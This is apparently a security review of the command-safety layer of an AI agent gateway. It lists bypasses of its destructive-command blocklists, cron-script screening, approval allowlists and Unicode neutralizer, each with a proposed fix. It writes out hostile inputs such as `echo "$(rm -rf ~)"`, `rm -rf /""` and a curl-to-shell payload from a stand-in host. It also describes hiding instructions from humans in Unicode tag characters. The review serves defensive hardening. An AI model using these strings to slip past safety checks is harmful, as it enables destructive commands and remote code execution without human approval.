# security review
### [P1] Raw script never inspected: echo/printf/grep arguments are blanked, so `$(...)` inside them evades hardline and dangerous detection
- Location: /Users/indo/code/project/omon-gateway/src/security/normalize.rs:674-696 (echo/printf blanking), :805-826 (`grep_safe_detection_variant`), :1042-1075 (`command_detection_variants_with_budget`); caller /Users/indo/code/project/omon-gateway/src/tools/cron.rs:68-80, :449, :616
- Trigger: An agent calls the cron tool with `script` (or `ack_command`) set to `echo "$(rm -rf ~)"` or ``echo `reboot` ``. `check_cron_script` is the only screen. The executor then runs the script with `sh -c` (executor.rs:427, ack.rs:31).
  - For echo/printf (no `|` or `>` in the segment), every non-dash argument token is replaced by spaces (normalize.rs:690-695). The `$(rm`, `~)` and backtick tokens are among them.
  - The unblanked `normalized` string is never added as a variant. The first variant is the blanked `grep_safe`, and the marked variant is derived from it.
  - The word-deobfuscation variants are only added when a word actually changes, and `reboot)` and `rm` do not change.
  - So `detect_hardline_command` and `detect_dangerous_command` see `echo   -rf   ` and return nothing.
  - The same applies to `grep "$(reboot)" f`, because the grep pattern operand is blanked.
- Impact: Hardline commands and dangerous commands run unattended from cron when the shell executes the substitution. The cron-script and ack screening is bypassed. The terminal tool is mostly not affected, because its `sh -c` payload is added to the variants unblanked at normalize.rs:1049-1050.
- Fix: Always include the unblanked `normalized` string as a variant. Alternatively, only blank a quoted span when it is single-quoted, or when it contains no `$(`, a backtick or `${`.

### [P1] Hardline `rm` of root, system dirs or home is bypassed with an empty double-quote pair
- Location: /Users/indo/code/project/omon-gateway/src/security/normalize.rs:14 and :115; /Users/indo/code/project/omon-gateway/src/security/hardline.rs:17-27
- Trigger: This depends on how I read `r#"''|""""#`.
  - The raw string terminates at the first `"#`, so its content is `''|"""` (three double quotes). `EMPTY_QUOTES_RE` therefore strips `''` and `"""` but not `""`. This is the part I am least sure of, because I did not run the regex.
  - With `""` left in place, `rm -rf /""`, `rm -rf ~""` and `rm -rf /etc""` become the string `rm -rf /""`.
  - The hardline path regex needs whitespace, end of string or `)`, backtick, `;`, `|` or `&` after the path, or surrounding quotes. A `"` right after `/` matches none of those.
  - The word-deobfuscation variants only rewrite command-position words, so they do not repair the argument.
  - The input reaches the detector as a raw shell string through `sh -c 'rm -rf /""'` (the payload variant is unblanked) or through a cron script.
  - Under `ApprovalPolicy::Never` or a `/yolo` session, hardline is the only barrier (terminal.rs:206-243 and :207-212 for hardline, then the policy and yolo early returns).
- Impact: The unconditional blocklist for `rm -rf /`, `~` and system directories can be dodged. A cron script is also only rejected by hardline plus dangerous. `rm -rf /""` still matches the dangerous rule `delete in root path`, so under Smart policy it falls back to an approval prompt rather than running unreviewed.
- Fix: Change the pattern to `r#"''|"""#`, with exactly two double quotes in the content. Better, strip empty quote pairs in a loop, since `'''` and `"""` style nesting also leaves residue. Add a hardline test for `rm -rf /""`.

### [P1] The `rm -f /tmp/hermes-verify-*` exemption skips all dangerous detection for shell strings that carry a trailing payload
- Location: /Users/indo/code/project/omon-gateway/src/security/dangerous.rs:305-323 and :333-335
- Trigger: A cron script (or ack_command) is `rm -f /tmp/hermes-verify-a;curl${IFS}http://e/x.sh|sh`.
  - The check runs on the raw command, before normalization.
  - `split_whitespace` yields exactly three parts, because there are no spaces after the path.
  - `parts[2]` starts with `/tmp/`, and `file_name()` is `hermes-verify-a;curl${IFS}http:` so it passes the `hermes-verify-` prefix test. (The `/` characters split the path component, but the prefix check only looks at the first component after `/tmp/`.)
  - `detect_dangerous_command` returns `None` before any variant is built. dash expands `${IFS}` into spaces at run time.
  - `rm -f /tmp/../etc/hermes-verify-x` also passes the prefix test: it is a string `starts_with("/tmp/")` with no `..` normalization.
- Impact: `check_cron_script` accepts arbitrary pipe-to-shell or destructive commands appended after a `;`, `&&` or `|`. Hardline is still checked separately. Only dangerous detection is skipped.
- Fix: Require that the path contains no shell metacharacters (`;&|$\`()<>{}*?"'\\`) and no `..` component. Run the exemption on the normalized command, and compare against canonical path components rather than string prefixes.

### [P1] A scanned cron prompt containing "truncate ..." or "delete from ..." in ordinary prose is rejected as a dangerous command
- Location: /Users/indo/code/project/omon-gateway/src/security/dangerous.rs:66 (`TRUNCATE\s+(TABLE)?\s*\w`) and :296-300 (`DELETE FROM` without `WHERE` on the same line); /Users/indo/code/project/omon-gateway/src/security/scan.rs:133-137
- Trigger: A user or agent creates a cron job with the prompt "Summarize the logs and truncate the report to 500 words", or "Delete from the list any stale PRs". `scan_cron_prompt` runs `detect_dangerous_command` over natural-language text.
  - `TRUNCATE` is case-insensitive and `(TABLE)?` is optional, so "truncate the" matches.
  - `DELETE FROM` with no `WHERE` on that line matches the prose.
  - The job is refused with `dangerous_command: SQL TRUNCATE`.
- Impact: Legitimate cron prompts fail at create, update or sync (tools/cron.rs:438 and :570, store.rs:392, scheduler.rs:779).
- Fix: Do not run shell and SQL command patterns over free-text prompts. Keep them for script fields. If kept, require `TRUNCATE TABLE` and `DELETE FROM <ident>;` shapes.

### [P2] Hardline `kill -1` also blocks `kill -1 <pid>` (SIGHUP to one process)
- Location: /Users/indo/code/project/omon-gateway/src/security/hardline.rs:66
- Trigger: `kill -1 $(cat nginx.pid)` or `kill -1 1234`.
  - The pattern `\bkill\s+(-[^\s]+\s+)*-1\b` matches signal 1 as well as pid `-1` (kill all).
  - The test at /Users/indo/code/project/omon-gateway/src/security/mod.rs:171 pins `kill -1` as hardline.
- Impact: This command is blocked with no override, even for operators who set Never or yolo. The workaround is `kill -HUP`.
- Fix: Match `-1` only as the final operand (`-1\s*($|[;&|)])`), as the existing `kill -9 -1` rule effectively does.

### [P2] Any approved "always" or "session" `sh -c` / interpreter `-c` command becomes a broad grant
- Location: /Users/indo/code/project/omon-gateway/src/security/dangerous.rs:362-367 (generic execution-flag finding) and :376-381 (`derive_pattern_key`); /Users/indo/code/project/omon-gateway/src/discord/approval.rs:250 and :390-398
- Trigger: Someone clicks "Always" on `bash -c 'echo hi'`.
  - Its pattern key is the generic string `shell command via -c/-lc flag`, which is persisted in `approval_allowlist`.
  - Any later `sh -c <anything>` or `python -c ...` that matches no earlier regex derives the same key.
  - `request_with_scope` then returns Session without prompting.
- Impact: One broad approval covers arbitrary code run through `-c`. Commands that match an earlier `PATTERNS` rule are not affected, because they use a different key.
- Fix: Include a hash of the normalized payload in the key for execution-flag findings, or cap those findings at once/session scope.

### [P2] Neutralizer does not strip Unicode tag characters (U+E0000-E007F) or other invisible smuggling characters
- Location: /Users/indo/code/project/omon-gateway/src/security/neutralize.rs:12-25 and :41-42 (compare scan.rs:23-26, which rejects tags)
- Trigger: A Discord user writes a message or display name containing tag-character-encoded instructions. `neutralize_untrusted_inline_text` is applied to message content, author and channel names (adapter.rs:170, message_context.rs:1078-1080), but `is_invisible_or_control` does not cover that range, variation selectors or U+034F.
- Impact: Hidden instructions pass into the prompt unseen by humans. This is the "ASCII smuggling" path.
- Fix: Add `U+E0000..=U+E007F` (and ideally `U+FE00..=U+FE0F`, `U+034F`, `U+180E`) to `is_invisible_or_control`.

### [P2] Cron prompt scanner rejects every U+200C (ZWNJ)
- Location: /Users/indo/code/project/omon-gateway/src/security/scan.rs:8 and :23-26
- Trigger: A cron prompt written in Persian, Urdu or Hindi, which use ZWNJ legitimately, gets `invisible_unicode`. Only ZWJ between emoji is exempted.
- Impact: Create or update of such prompts is refused.
- Fix: Allow ZWNJ between letters in the same script, or flag it only alongside other suspicious content.

### [P2] User deny globs are anchored full matches, and the matcher does quadratic work on long input
- Location: /Users/indo/code/project/omon-gateway/src/security/hardline.rs:144-168 and :186-203
- Trigger: With deny `npm publish *`, the bare `npm publish` does not match, because the pattern needs a space plus a tail. A long script of up to 128k characters can also produce up to roughly 25k wrapper-stripped forms. Each form is matched with an allocation of `(p+1)*(t+1)` booleans, for every variant and every glob.
- Impact: The deny rule is silently ineffective for the argument-less form of the command. A crafted command can burn large amounts of CPU and memory in the approval path.
- Fix: Also try `pattern.trim_end_matches(" *")` against the exact command. Use an iterative two-pointer glob matcher with O(1) extra space and cap the number of forms.
